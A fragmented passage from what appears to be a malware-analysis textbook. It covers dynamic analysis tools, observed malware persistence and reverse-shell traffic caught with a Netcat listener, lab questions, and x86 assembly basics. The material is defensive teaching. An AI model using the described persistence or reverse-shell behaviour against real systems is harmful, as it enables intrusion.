this by using the Windows sc command or by modifying the registry for an unused ser-
vice, and then using net start on that service. The service entries are located in the 
registry at HKLM\SYSTEM\CurrentControlSet\Services.
[Word Count: 63]

WARNING 
Throughout this chapter, we will use tools to test malware dynamically. When you test 
malware, be sure to protect your computers and networks by using a virtual machine, 
as discussed in the previous chapter.
[Word Count: 35]

It’s not always easy to find information in procmon when you are looking 
through thousands of events, one by one. That’s where procmon’s filtering 
capability is key.
[Word Count: 27]

NOTE
Procmon uses some basic filters by default. For example, it contains a filter that excludes 
procmon.exe and one that excludes the pagefile from logging, because it is accessed 
often and provides no useful information.
[Word Count: 35]

Registry
By examining registry operations, you can tell how a piece of 
malware installs itself in the registry.
[Word Count: 18]

File system 
Exploring file system interaction can show all files that the 
malware creates or configuration files it uses.
[Word Count: 19]

Process activity
Investigating process activity can tell you whether the 
malware spawned additional processes.
[Word Count: 14]

Network 
Identifying network connections can show you any ports on 
which the malware is listening.
[Word Count: 15]

All four filters are selected by default. To turn off a filter, simply click the 
icon in the toolbar corresponding to the category.
[Word Count: 23]

NOTE
If your malware runs at boot time, use procmon’s boot logging options to install proc-
mon as a startup driver to capture startup events.
[Word Count: 25]

Analysis of procmon’s recorded events takes practice and patience, since 
many events are simply part of the standard way that executables start up. 
The more you use procmon, the easier you will find it to quickly review the 
event listing.
[Word Count: 40]

The Process Explorer, free from Microsoft, is an extremely powerful task 
manager that should be running when you are performing dynamic analysis. 
It can provide valuable insight into the processes currently running on a 
system. 
You can use Process Explorer to list active processes, DLLs loaded by a 
process, various process properties, and overall system information. You can 
also use it to kill a process, log out users, and launch and validate processes.
[Word Count: 73]

Process Explorer monitors the processes running on a system and shows 
them in a tree structure that displays child and parent relationships. For 
example, in Figure 3-5 you can see that services.exe is a child process of 
winlogon.exe, as indicated by the left curly bracket.
[Word Count: 45]

Figure 3-5: Process Explorer examining svchost.exe malware
[Word Count: 7]

Process Explorer shows five columns: Process (the process name), 
PID (the process identifier), CPU (CPU usage), Description, and Company 
Name. The view updates every second. By default, services are highlighted in 
pink, processes in blue, new processes in green, and terminated processes in 
red. Green and red highlights are temporary, and are removed after the pro-
cess has started or terminated. When analyzing malware, watch the Process 
Explorer window for changes or new processes, and be sure to investigate 
them thoroughly.
[Word Count: 81]

Figure 3-6: The Properties window, Image tab
[Word Count: 7]

as the process it is replacing, so that the malware appears to be executing as a 
legitimate process, but it leaves a fingerprint: The image in memory will dif-
fer from the image on disk. For example, in Figure 3-6, the svchost.exe process 
is verified, yet it is actually malware. We’ll discuss process replacement in 
more detail in Chapter 12.
[Word Count: 60]

Figure 3-7: The Process Explorer Strings tab shows strings on disk (left) versus strings in 
memory (right) for active svchost.exe.
[Word Count: 20]

You can also use Process Explorer to analyze malicious documents, such as 
PDFs and Word documents. A quick way to determine whether a document 
is malicious is to open Process Explorer and then open the suspected mali-
cious document. If the document launches any processes, you should see 
them in Process Explorer, and be able to locate the malware on disk via the 
Image tab of the Properties window.
[Word Count: 69]

NOTE
Opening a malicious document while using monitoring tools can be a quick way to 
determine whether a document is malicious; however, you will have success running 
only vulnerable versions of the document viewer. In practice, it is best to use intention-
ally unpatched versions of the viewing application to ensure that the exploitation will 
be successful. The easiest way to do this is with multiple snapshots of your analysis vir-
tual machine, each with old versions of document viewers such as Adobe Reader and 
Microsoft Word.
[Word Count: 87]

Comparing Registry Snapshots with Regshot
[Word Count: 5]

Listing 3-1 displays a subset of the results generated by Regshot during 
malware analysis. Registry snapshots were taken before and after running the 
spyware ckr.exe.
[Word Count: 25]

Regshot
Comments:
Datetime: <date>
Computer: MALWAREANALYSIS
Username: username
[Word Count: 8]

----------------------------------
Keys added: 0
----------------------------------
[Word Count: 5]

Regshot (shown in Figure 3-8) is 
an open source registry compari-
son tool that allows you to take 
and compare two registry snap-
shots.
To use Regshot for malware 
analysis, simply take the first shot 
by clicking the 1st Shot button, 
and then run the malware and 
wait for it to finish making any 
system changes. Next, take the 
second shot by clicking the 2nd 
Shot button. Finally, click the 
Compare button to compare the 
two snapshots.
[Word Count: 77]

----------------------------------
Values added:3
----------------------------------
 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ckr:C:\WINDOWS\system32\
ckr.exe
...
...
[Word Count: 9]

----------------------------------
Values modified:2
----------------------------------
 HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed: 00 43 7C 25 9C 68 DE 59 C6 C8 
9D C3 1D E6 DC 87 1C 3A C4 E4 D9 0A B1 BA C1 FB 80 EB 83 25 74 C4 C5 E2 2F CE 
4E E8 AC C8 49 E8 E8 10 3F 13 F6 A1 72 92 28 8A 01 3A 16 52 86 36 12 3C C7 EB 
5F 99 19 1D 80 8C 8E BD 58 3A DB 18 06 3D 14 8F 22 A4
...
[Word Count: 87]

----------------------------------
Total changes:5
----------------------------------
[Word Count: 4]

As you can see ckr.exe creates a value at HKLM\SOFTWARE\Microsoft\Windows\
CurrentVersion\Run as a persistence mechanism . A certain amount of noise  
is typical in these results, because the random-number generator seed is con-
stantly updated in the registry. 
As with procmon, your analysis of these results requires patient scanning 
to find nuggets of interest.
[Word Count: 55]

ApateDNS, a free tool from Mandiant (www.mandiant.com/products/research/
mandiant_apatedns/download), is the quickest way to see DNS requests made 
by malware. ApateDNS spoofs DNS responses to a user-specified IP address by 
listening on UDP port 53 on the local machine. It responds to DNS requests 
with the DNS response set to an IP address you specify. ApateDNS can display 
the hexadecimal and ASCII results of all requests it receives.
[Word Count: 67]

To use ApateDNS, set the IP address you want sent in DNS responses 
at  and select the interface at . Next, press the Start Server button; this 
will automatically start the DNS server and change the DNS settings to 
localhost. Next, run your malware and watch as DNS requests appear in 
the ApateDNS window. For example, in Figure 3-9, we redirect the DNS 
requests made by malware known as RShell. We see that the DNS information 
is requested for evil.malwar3.com and that request was made at 13:22:08 .
[Word Count: 89]

Figure 3-9: ApateDNS responding to a request for evil.malwar3.com
[Word Count: 9]

C:\> nc –l –p 80 
POST /cq/frame.htm HTTP/1.1
Host: www.google.com 
User-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; TWFsd2FyZUh1bnRlcg==; 
rv:1.38)
Accept: text/html, application
Accept-Language: en-US, en:q=
Accept-Encoding: gzip, deflate
Keep-Alive: 300
Content-Type: application/x-form-urlencoded
Content-Length
[Word Count: 34]

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 10]

Listing 3-2: Netcat example listening on port 80
[Word Count: 8]

The Netcat (nc) command  shows the options required to listen on a 
port. The –l flag means listen, and –p (with a port number) specifies the port 
on which to listen. The malware connects to our Netcat listener because we’re 
using ApateDNS for redirection. As you can see, RShell is a reverse shell , 
but it does not immediately provide the shell. The network connection first 
appears as an HTTP POST request to www.google.com , fake POST data that 
RShell probably inserts to obfuscate its reverse shell, because network analysts 
frequently look only at the start of a session.
[Word Count: 100]

Wireshark is an open source sniffer, a packet capture tool that intercepts and 
logs network traffic. Wireshark provides visualization, packet-stream analysis, 
and in-depth analysis of individual packets.
Like many tools discussed in this book, Wireshark can be used for both 
good and evil. It can be used to analyze internal networks and network usage, 
debug application issues, and study protocols in action. But it can also be 
used to sniff passwords, reverse-engineer network protocols, steal sensitive 
information, and listen in on the online chatter at your local coffee shop.
The Wireshark display has four parts, as shown in Figure 3-10:
[Word Count: 100]


The Filter box  is used to filter the packets displayed.
[Word Count: 12]


The packet listing  shows all packets that satisfy the display filter.
[Word Count: 13]


The packet detail window  displays the contents of the currently 
selected packet (in this case, packet 47).
[Word Count: 19]


The hex window  displays the hex contents of the current packet. The 
hex window is linked with the packet detail window and will highlight 
any fields you select.
[Word Count: 30]

Figure 3-10: Wireshark DNS and HTTP example
[Word Count: 7]

To use Wireshark to view the contents of a TCP session, right-click any 
TCP packet and select Follow TCP Stream. As you can see in Figure 3-11, 
both ends of the conversation are displayed in session order, with different 
colors showing each side of the connection.
[Word Count: 46]

Figure 3-11: Wireshark’s Follow TCP Stream window
[Word Count: 7]

To capture packets, choose CaptureInterfaces and select the interface 
you want to use to collect packets. Options include using promiscuous mode 
or setting a capture filter.
[Word Count: 26]

WARNING 
Wireshark is known to have many security vulnerabilities, so be sure to run it in a safe 
environment.
[Word Count: 19]

Wireshark can help you to understand how malware is performing net-
work communication by sniffing packets as the malware communicates. To 
use Wireshark for this purpose, connect to the Internet or simulate an 
Internet connection, and then start Wireshark’s packet capture and run 
the malware. (You can use Netcat to simulate an Internet connection.)
Chapter 14 discusses protocol analysis and additional uses of Wireshark 
in more detail.
[Word Count: 67]

* discard 9/tcp - started (PID 10013)
  * quotd 17/tcp - started (PID 10015)
  * quotd 17/udp - started (PID 10016)
  * chargen 19/tcp - started (PID 10017)
  * dummy 1/udp - started (PID 10020)
  * chargen 19/udp - started (PID 10018)
  * dummy 1/tcp - started (PID 10019)
[Word Count: 49]

Listing 3-3: INetSim default emulated services
[Word Count: 6]

All the tools discussed in this chapter can be used in concert to maximize 
the amount of information gleaned during dynamic analysis. In this section, 
we’ll look at all the tools discussed in the chapter as we present a sample 
setup for malware analysis. Your setup might include the following:
[Word Count: 50]

1.
Running procmon and setting a filter on the malware executable name 
and clearing out all events just before running.
[Word Count: 20]

3.
Gathering a first snapshot of the registry using Regshot.
[Word Count: 10]

4.
Setting up your virtual network to your liking using INetSim and 
ApateDNS.
[Word Count: 13]

5.
Setting up network traffic logging using Wireshark.
[Word Count: 8]

Figure 3-12: Example of a virtual network
[Word Count: 7]

Let’s see how this setup would work in practice by examining the mal-
ware msts.exe. We complete our initial setup and then run msts.exe on our 
malware analysis virtual machine. After some time, we stop event capture 
with procmon and run a second snapshot with Regshot. At this point we 
begin analysis as follows:
[Word Count: 54]

1.
Examine ApateDNS to see if DNS requests were performed. As shown in 
Figure 3-13, we notice that the malware performed a DNS request for 
www.malwareanalysisbook.com.
[Word Count: 26]

Figure 3-13: ApateDNS request for 
www.malwareanalysisbook.com
[Word Count: 6]

IP Address = 192.168.117.170
DNS Server = 127.0.0.1
[Word Count: 8]

2.
Review the procmon results for file system modifications. In the 
procmon results shown in Figure 3-14, we see CreateFile and WriteFile 
(sequence numbers 141 and 142) operations for C:\WINDOWS\system32\
winhlp2.exe. Upon further investigation, we compare winhlp2.exe to 
msts.exe and see that they are identical. We conclude that the malware 
copies itself to that location.
[Word Count: 55]

Figure 3-14: Procmon output with the msts.exe filter set
[Word Count: 9]

3.
Compare the two snapshots taken with Regshot to identify changes. 
Reviewing the Regshot results, shown next, we see that the malware 
installed the autorun registry value winhlp at HKLM\SOFTWARE\Microsoft\
Windows\CurrentVersion\Run location. The data written to that value is 
where the malware copied itself (C:\WINDOWS\system32\winhlp2.exe), 
and that newly copied binary will execute upon system reboot.
[Word Count: 55]

Values added:3
----------------------------------
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\winhlp: C:\WINDOWS\system32\winhlp2.exe
[Word Count: 5]

4.
Use Process Explorer to examine the process to determine whether it cre-
ates mutexes or listens for incoming connections. The Process Explorer 
output in Figure 3-15 shows that msts.exe creates a mutex (also known as a 
mutant) named Evil1 . We discuss mutexes in depth in Chapter 7, but 
you should know that msts.exe likely created the mutex to ensure that only 
one version of the malware is running at a time. Mutexes can provide an 
excellent fingerprint for malware if they are unique enough.
[Word Count: 86]

5.
Review the INetSim logs for requests and attempted connections on 
standard services. The first line in the INetSim logs (shown next) tells us 
that the malware communicates over port 443, though not with standard 
Secure Sockets Layer (SSL), as shown next in the reported errors at .
[Word Count: 48]

[2010-X] [15013] [https 443/tcp 15199] [192.168.117.128:1043] connect
[2010-X] [15013] [https 443/tcp 15199] [192.168.117.128:1043]
 Error setting up SSL:  SSL accept attempt failed with unknown error
Error:140760FC:SSL routines:SSL23_GET_CLIENT_HELLO:unknown protocol
[2010-X] [15013] [https 443/tcp 15199] [192.168.117.128:1043] disconnect
[Word Count: 35]

Figure 3-15: Process Explorer’s examination of an active msts.exe process
[Word Count: 10]

Figure 3-16: Wireshark showing the custom network protocol
[Word Count: 8]

Basic dynamic analysis of malware can assist and confirm your basic static 
analysis findings. Most of the tools described in this chapter are free and easy 
to use, and they provide considerable detail.
However, basic dynamic analysis techniques have their deficiencies, so 
we won’t stop here. For example, to understand the networking component 
in the msts.exe fully, you would need to reverse-engineer the protocol to 
determine how best to continue your analysis. The next step is to perform 
advanced static analysis techniques with disassembly and dissection at the 
binary level, which is discussed in the next chapter.
[Word Count: 97]

Analyze the malware found in the file Lab03-01.exe using basic dynamic analy-
sis tools.
[Word Count: 14]

1.
What are this malware’s imports and strings?
[Word Count: 8]

2.
What are the malware’s host-based indicators?
[Word Count: 7]

3.
Are there any useful network-based signatures for this malware? If so, 
what are they?
[Word Count: 15]

Analyze the malware found in the file Lab03-02.dll using basic dynamic analy-
sis tools.
[Word Count: 14]

1.
How can you get this malware to install itself?
[Word Count: 10]

2.
How would you get this malware to run after installation?
[Word Count: 11]

3.
How can you find the process under which this malware is running?
[Word Count: 13]

4.
Which filters could you set in order to use procmon to glean 
information?
[Word Count: 14]

5.
What are the malware’s host-based indicators?
[Word Count: 7]

6.
Are there any useful network-based signatures for this malware?
[Word Count: 10]

Execute the malware found in the file Lab03-03.exe while monitoring it using 
basic dynamic analysis tools in a safe environment.
[Word Count: 20]

1.
What do you notice when monitoring this malware with Process 
Explorer?
[Word Count: 12]

2.
Can you identify any live memory modifications?
[Word Count: 8]

3.
What are the malware’s host-based indicators?
[Word Count: 7]

Analyze the malware found in the file Lab03-04.exe using basic dynamic analy-
sis tools. (This program is analyzed further in the Chapter 9 labs.)
[Word Count: 24]

2.
What is causing the roadblock in dynamic analysis?
[Word Count: 9]

3.
Are there other ways to run this program?
[Word Count: 9]

A D V A N C E D  S T A T I C  A N A L Y S I S
[Word Count: 22]

A  C R A S H  C O U R S E  I N  X 8 6  
D I S A S S E M B L Y
[Word Count: 28]

As discussed in previous chapters, basic static and 
dynamic malware analysis methods are good for ini-
tial triage, but they do not provide enough informa-
tion to analyze malware completely.
[Word Count: 30]

Figure 4-1 shows a simplified model, but computer systems are generally 
described with the following six different levels of abstraction. We list these 
levels starting from the bottom. Higher levels of abstraction are placed near 
the top with more specific concepts underneath, so the lower you get, the 
less portable the level will be across computer systems.
[Word Count: 57]

Hardware
The hardware level, the only physical level, consists of elec-
trical circuits that implement complex combinations of logical operators 
such as XOR, AND, OR, and NOT gates, known as digital logic. Because 
of its physical nature, hardware cannot be easily manipulated by software.
[Word Count: 44]

Microcode
The microcode level is also known as firmware. Microcode 
operates only on the exact circuitry for which it was designed. It contains 
microinstructions that translate from the higher machine-code level to 
provide a way to interface with the hardware. When performing malware 
analysis, we usually don’t worry about the microcode because it is often 
specific to the computer hardware for which it was written.
[Word Count: 65]

Machine code
The machine code level consists of opcodes, hexadecimal 
digits that tell the processor what you want it to do. Machine code is typi-
cally implemented with several microcode instructions so that the under-
lying hardware can execute the code. Machine code is created when a 
computer program written in a high-level language is compiled.
[Word Count: 56]

Low-level languages
A low-level language is a human-readable version 
of a computer architecture’s instruction set. The most common low-level 
language is assembly language. Malware analysts operate at the low-level 
languages level because the machine code is too difficult for a human to 
comprehend. We use a disassembler to generate low-level language text, 
which consists of simple mnemonics such as mov and jmp. Many different 
dialects of assembly language exist, and we’ll explore each in turn.
[Word Count: 75]

NOTE
Assembly is the highest level language that can be reliably and consistently recovered 
from machine code when high-level language source code is not available.
[Word Count: 25]

High-level languages
Most computer programmers operate at the level 
of high-level languages. High-level languages provide strong abstraction 
from the machine level and make it easy to use programming logic and 
flow-control mechanisms. High-level languages include C, C++, and oth-
ers. These languages are typically turned into machine code by a com-
piler through a process known as compilation.
[Word Count: 58]

Most 32-bit personal computers are x86, also known as Intel IA-32, and 
all modern 32-bit versions of Microsoft Windows are designed to run on the 
x86 architecture. Additionally, most AMD64 or Intel 64 architectures running 
Windows support x86 32-bit binaries. For this reason, most malware is com-
piled for x86, which will be our focus throughout this book. (Chapter 21 cov-
ers malware compiled for the Intel 64 architecture.) Here, we’ll focus on the 
x86 architecture aspects that come up most often during malware analysis.
[Word Count: 85]

NOTE
For additional information about assembly, Randall Hyde’s The Art of Assembly 
Language, 2nd Edition (No Starch Press, 2010) is an excellent resource. Hyde’s book 
offers a patient introduction to x86 assembly for non-assembly programmers.
[Word Count: 35]

The internals of most modern computer architectures (including x86) fol-
low the Von Neumann architecture, illustrated in Figure 4-2. It has three 
hardware components:
[Word Count: 24]


The central processing unit (CPU) executes code.
[Word Count: 8]


The main memory of the system (RAM) stores all data and code.
[Word Count: 13]


An input/output system (I/O) interfaces with devices such as hard drives, 
keyboards, and monitors.
[Word Count: 15]

As you can see in Figure 4-2, the CPU contains several components: 
The control unit gets instructions to execute from RAM using a register (the 
instruction pointer), which stores the address of the instruction to execute. 
Registers are the CPU’s basic data storage units and are often used to save 
time so that the CPU doesn’t need to access RAM. The arithmetic logic unit 
(ALU) executes an instruction fetched from RAM and places the results in 
registers or memory. The process of fetching and executing instruction after 
instruction is repeated as a program runs.
[Word Count: 94]

The main memory (RAM) for a single program can be divided into the fol-
lowing four major sections, as shown in Figure 4-3.
[Word Count: 23]

Figure 4-3: Basic memory layout for a program
[Word Count: 8]

Data
This term can be used to refer to a specific section of memory 
called the data section, which contains values that are put in place when a 
program is initially loaded. These values are sometimes called static val-
ues because they may not change while the program is running, or they 
may be called global values because they are available to any part of the 
program.
[Word Count: 67]

Code
Code includes the instructions fetched by the CPU to execute 
the program’s tasks. The code controls what the program does and 
how the program’s tasks will be orchestrated.
[Word Count: 29]

Heap
The heap is used for dynamic memory during program execution, 
to create (allocate) new values and eliminate (free) values that the pro-
gram no longer needs. The heap is referred to as dynamic memory because 
its contents can change frequently while the program is running.
[Word Count: 46]

Stack
The stack is used for local variables and parameters for functions, 
and to help control program flow. We will cover the stack in depth later 
in this chapter.
[Word Count: 29]

Although the diagram in Figure 4-3 shows the four major sections of 
memory in a particular order, these pieces may be located throughout mem-
ory. For example, there is no guarantee that the stack will be lower than the 
code or vice versa.
[Word Count: 43]

Instructions are the building blocks of assembly programs. In x86 assembly, 
an instruction is made of a mnemonic and zero or more operands. As shown in
[Word Count: 26]

Table 4-1, the mnemonic is a word that identifies the instruction to execute, 
such as mov, which moves data. Operands are typically used to identify infor-
mation used by the instruction, such as registers or data.
[Word Count: 36]

Each instruction corresponds to opcodes (operation codes) that tell the CPU 
which operation the program wants to perform. This book and other sources 
use the term opcode for the entire machine instruction, although Intel techni-
cally defines it much more narrowly.
Disassemblers translate opcodes into human-readable instructions. For 
example, in Table 4-2, you can see that the opcodes are B9 42 00 00 00 for the 
instruction mov ecx, 0x42. The value 0xB9 corresponds to mov ecx, and 0x42000000 
corresponds to the value 0x42.
[Word Count: 84]

Operands are used to identify the data used by an instruction. Three types of 
operands can be used:
[Word Count: 18]


Immediate operands are fixed values, such as the 0x42 shown in Table 4-1.
[Word Count: 14]


Register operands refer to registers, such as ecx in Table 4-1.
[Word Count: 12]


Memory address operands refer to a memory address that contains the 
value of interest, typically denoted by a value, register, or equation 
between brackets, such as [eax].
[Word Count: 28]

Mnemonic
Destination operand 
Source operand
[Word Count: 5]

A register is a small amount of data storage available to the CPU, whose con-
tents can be accessed more quickly than storage available elsewhere. x86 pro-
cessors have a collection of registers available for use as temporary storage or 
workspace. Table 4-3 shows the most common x86 registers, which fall into 
the following four categories:
[Word Count: 56]


General registers are used by the CPU during execution.
[Word Count: 10]


Segment registers are used to track sections of memory.
[Word Count: 10]


Status flags are used to make decisions.
[Word Count: 8]


Instruction pointers are used to keep track of the next instruction to execute.
[Word Count: 14]

You can use Table 4-3 as a reference throughout this chapter to see how 
a register is categorized and broken down. The sections that follow discuss 
each of these register categories in depth.
[Word Count: 33]

The general registers typically store data or memory addresses, and are often 
used interchangeably to get things accomplished within the program. How-
ever, despite being called general registers, they aren’t always used that way.
[Word Count: 34]

General registers
Segment registers
Status register
Instruction pointer
[Word Count: 8]

The EFLAGS register is a status register. In the x86 architecture, it is 32 bits 
in size, and each bit is a flag. During execution, each flag is either set (1) or 
cleared (0) to control CPU operations or indicate the results of a CPU oper-
ation. The following flags are most important to malware analysis:
[Word Count: 56]

ZF
The zero flag is set when the result of an operation is equal to zero; 
otherwise, it is cleared.
[Word Count: 20]

CF
The carry flag is set when the result of an operation is too large or 
too small for the destination operand; otherwise, it is cleared.
[Word Count: 26]

SF
The sign flag is set when the result of an operation is negative or 
cleared when the result is positive. This flag is also set when the most sig-
nificant bit is set after an arithmetic operation.
[Word Count: 38]

TF
The trap flag is used for debugging. The x86 processor will execute 
only one instruction at a time if this flag is set.
[Word Count: 24]

1010
1001
1101
1100
1000
0001
1111
0101
A
9
D
C
8
1
F
5
32 bits
[Word Count: 18]

NOTE
For details on all available flags, see Volume 1 of the Intel 64 and IA-32 Architec-
tures Software Developer’s Manuals, discussed at the end of this chapter.
[Word Count: 28]

In x86 architecture, EIP, also known as the instruction pointer or program counter, 
is a register that contains the memory address of the next instruction to be 
executed for a program. EIP’s only purpose is to tell the processor what to 
do next.
[Word Count: 43]

NOTE
When EIP is corrupted (that is, it points to a memory address that does not contain 
legitimate program code), the CPU will not be able to fetch legitimate code to execute, so 
the program running at the time will likely crash. When you control EIP, you can con-
trol what is executed by the CPU, which is why attackers attempt to gain control of EIP 
through exploitation. Generally, attackers must have attack code in memory and then 
change EIP to point to that code to exploit a system.
[Word Count: 89]

Another instruction similar to mov is lea, which means “load effective 
address.” The format of the instruction is lea destination, source. The lea 
instruction is used to put a memory address into the destination. For example, 
lea eax, [ebx+8] will put EBX+8 into EAX. In contrast, mov eax, [ebx+8] loads
[Word Count: 50]

mov eax, ebx
Copies the contents of EBX into the EAX register
[Word Count: 12]

mov eax, 0x42
Copies the value 0x42 into the EAX register
[Word Count: 11]

mov eax, [0x4037C4]
Copies the 4 bytes at the memory location 0x4037C4 into the EAX 
register
[Word Count: 16]

mov eax, [ebx]
Copies the 4 bytes at the memory location specified by the EBX 
register into the EAX register
[Word Count: 20]

mov eax, [ebx+esi*4]
Copies the 4 bytes at the memory location specified by the result of 
the equation ebx+esi*4 into the EAX register
[Word Count: 23]

the data at the memory address specified by EBX+8. Therefore, lea eax, [ebx+8] 
would be the same as mov eax, ebx+8; however, a mov instruction like that is 
invalid.
Figure 4-5 shows values for registers EAX and EBX on the left and the 
information contained in memory on the right. EBX is set to 0xB30040. At 
address 0xB30048 is the value 0x20. The instruction mov eax, [ebx+8] places 
the value 0x20 (obtained from memory) into EAX, and the instruction lea 
eax, [ebx+8] places the value 0xB30048 into EAX.
[Word Count: 88]

Figure 4-5: EBX register used to access memory
[Word Count: 8]

The lea instruction is not used exclusively to refer to memory addresses. 
It is useful when calculating values, because it requires fewer instructions. 
For example, it is common to see an instruction such as lea ebx, [eax*4+4], 
where eax is a number, rather than a memory address. This instruction is the 
functional equivalent of ebx = (eax+1)*4, but the former is shorter or more 
efficient for the compiler to use instead of a total of four instructions (for 
example inc eax; mov ecx, 4; mul ecx; mov ebx, eax).
[Word Count: 89]

Table 4-5: Addition and Subtraction Instruction Examples
[Word Count: 7]

add eax, ebx
Adds EBX to EAX and stores the result in EAX
[Word Count: 13]

A programmer obtains the remainder of a division operation by using an 
operation known as modulo, which will be compiled into assembly through 
the use of the EDX register after the div instruction (since it contains the 
remainder). Table 4-6 shows examples of the mul and div instructions. The 
instructions imul and idiv are the signed versions of the mul and div instructions.
[Word Count: 63]

The div value instruction does the 
same thing as mul, except in the oppo-
site direction: It divides the 64 bits 
across EDX and EAX by value. There-
fore, the EDX and EAX registers must 
be set up appropriately before the divi-
sion occurs. The result of the division 
operation is stored in EAX, and the 
remainder is stored in EDX.
[Word Count: 61]

Figure 4-6: Multiplication result stored 
across EDX and EAX registers
[Word Count: 10]

Table 4-6: Multiplication and Division Instruction Examples
[Word Count: 7]

mul 0x50
Multiplies EAX by 0x50 and stores the result in EDX:EAX
[Word Count: 12]

div 0x75
Divides EDX:EAX by 0x75 and stores the result in EAX and the remainder in EDX
[Word Count: 17]

binary value 1000 and shift it right by 1, the result is 0100. At the end of the 
shift instruction, the CF flag contains the last bit shifted out of the destina-
tion operand.
The rotation instructions, ror and rol, are similar to the shift instructions, 
except the shifted bits that “fall off” with the shift operation are rotated to 
the other end. In other words, during a right rotation (ror) the least signifi-
cant bits are rotated to the most significant position. Left rotation (rol) is the 
exact opposite. Table 4-7 displays examples of these instructions.
[Word Count: 97]

Table 4-7: Common Logical and Shifting Arithmetic Instructions
[Word Count: 8]

or eax, 0x7575
Performs the logical or operation on EAX with 0x7575
[Word Count: 12]

mov eax, 0xA
shl eax, 2
Shifts the EAX register to the left 2 bits; these two instructions result in 
EAX = 0x28, because 1010 (0xA in binary) shifted 2 bits left is 
101000 (0x28)
[Word Count: 35]

mov bl, 0xA
ror bl, 2
Rotates the BL register to the right 2 bits; these two instructions result in 
BL = 10000010, because 1010 rotated 2 bits right is 10000010
[Word Count: 31]

1.
Arguments are placed on the stack using push instructions.
[Word Count: 10]

2.
A function is called using call memory_location. This causes the current 
instruction address (that is, the contents of the EIP register) to be 
pushed onto the stack. This address will be used to return to the main 
code when the function is finished. When the function begins, EIP is set 
to memory_location (the start of the function).
[Word Count: 58]

3.
Through the use of a function prologue, space is allocated on the stack 
for local variables and EBP (the base pointer) is pushed onto the stack. 
This is done to save EBP for the calling function.
[Word Count: 37]

5.
Through the use of a function epilogue, the stack is restored. ESP is 
adjusted to free the local variables, and EBP is restored so that the call-
ing function can address its variables properly. The leave instruction can 
be used as an epilogue because it sets ESP to equal EBP and pops EBP off 
the stack.
[Word Count: 57]

6.
The function returns by calling the ret instruction. This pops the return 
address off the stack and into EIP, so that the program will continue exe-
cuting from where the original call was made.
[Word Count: 35]

7.
The stack is adjusted to remove the arguments that were sent, unless 
they’ll be used again later.
[Word Count: 18]

As discussed, the stack is allocated in a top-down fashion, with the higher 
memory addresses used first. Figure 4-7 shows how the stack is laid out in 
memory. Each time a call is performed, a new stack frame is generated. A 
function maintains its own stack frame until it returns, at which time the 
caller’s stack frame is restored and execution is transferred back to the call-
ing function.
[Word Count: 69]

Figure 4-8 shows a dissection of one of the individual stack frames from 
Figure 4-7. The memory locations of individual items are also displayed. In 
this diagram, ESP would point to the top of the stack, which is the memory 
address 0x12F02C. EBP would be set to 0x12F03C throughout the duration 
of the function, so that the local variables and arguments can be referenced 
using EBP. The arguments that are pushed onto the stack before the call are
[Word Count: 78]


pusha pushes the 16-bit registers on the stack in the following order: AX, 
CX, DX, BX, SP, BP, SI, DI.
[Word Count: 21]


pushad pushes the 32-bit registers on the stack in the following order: 
EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI.
[Word Count: 21]

These instructions are typically encountered in shellcode when someone 
wants to save the current state of the registers to the stack so that they can be 
restored at a later time. Compilers rarely use these instructions, so seeing 
them often indicates someone hand-coded assembly and/or shellcode.
[Word Count: 46]

Table 4-9 shows the most common conditional jump instructions and details 
of how they operate. Jcc is the shorthand for generally describing conditional 
jumps.
[Word Count: 24]

jz loc
Jump to specified location if ZF = 1.
[Word Count: 10]

jnz loc
Jump to specified location if ZF = 0.
[Word Count: 10]

je loc
Same as jz, but commonly used after a cmp instruction. Jump will occur if the 
destination operand equals the source operand.
[Word Count: 23]

jne loc
Same as jnz, but commonly used after a cmp. Jump will occur if the destination 
operand is not equal to the source operand.
[Word Count: 25]

jg loc
Performs signed comparison jump after a cmp if the destination operand is 
greater than the source operand.
[Word Count: 19]

jge loc
Performs signed comparison jump after a cmp if the destination operand is 
greater than or equal to the source operand.
[Word Count: 22]

ja loc
Same as jg, but an unsigned comparison is performed.
[Word Count: 11]

jae loc
Same as jge, but an unsigned comparison is performed.
[Word Count: 11]

jl loc
Performs signed comparison jump after a cmp if the destination operand is less 
than the source operand.
[Word Count: 19]

jle loc
Performs signed comparison jump after a cmp if the destination operand is less 
than or equal to the source operand.
[Word Count: 22]

jb loc
Same as jl, but an unsigned comparison is performed.
[Word Count: 11]

jbe loc
Same as jle, but an unsigned comparison is performed.
[Word Count: 11]

jo loc
Jump if the previous instruction set the overflow flag (OF = 1).
[Word Count: 14]

js loc
Jump if the sign flag is set (SF = 1).
[Word Count: 12]

In x86, the repeat prefixes are used for multibyte operations. The rep 
instruction increments the ESI and EDI offsets, and decrements the ECX 
register. The rep prefix will continue until ECX = 0. The repe/repz and repne/
repnz prefixes will continue until ECX = 0 or until the ZF = 1 or 0. This is illus-
trated in Table 4-10. Therefore, in most data buffer manipulation instruc-
tions, ESI, EDI, and ECX must be properly initialized for the rep instruction 
to be useful.
[Word Count: 83]

Table 4-10: rep Instruction Termination Requirements
[Word Count: 6]

repe, repz
Repeat until ECX = 0 or ZF = 0
[Word Count: 11]

repne, repnz
Repeat until ECX = 0 or ZF = 1
[Word Count: 11]

The stosb instruction is used to store values in a location specified by 
EDI. This is identical to scasb, but instead of being searched for, the specified 
byte is placed in the location specified by EDI. The rep prefix is used with 
scasb to initialize a buffer of memory, wherein every byte contains the same 
value. This is equivalent to the C function memset. Table 4-11 displays some 
common rep instructions and describes their operation.
[Word Count: 75]

Because malware is often written in C, it’s important that you know how the 
main method of a C program translates to assembly. This knowledge will also 
help you understand how offsets differ when you go from C code to assembly.
A standard C program has two arguments for the main method, typically 
in this form:
[Word Count: 56]

The parameters argc and argv are determined at runtime. The argc 
parameter is an integer that contains the number of arguments on the 
command line, including the program name. The argv parameter is a 
pointer to an array of strings that contain the command-line arguments. 
The following example shows a command-line program and the results of 
argc and argv when the program is run.
[Word Count: 64]

argc = 3
argv[0] = filetestprogram.exe
argv[1] = -r
argv[2] = filename.txt
[Word Count: 12]

repe cmpsb
Used to compare two data buffers. EDI and ESI must be set to the two buffer 
locations, and ECX must be set to the buffer length. The comparison will 
continue until ECX = 0 or the buffers are not equal.
[Word Count: 42]

rep stosb
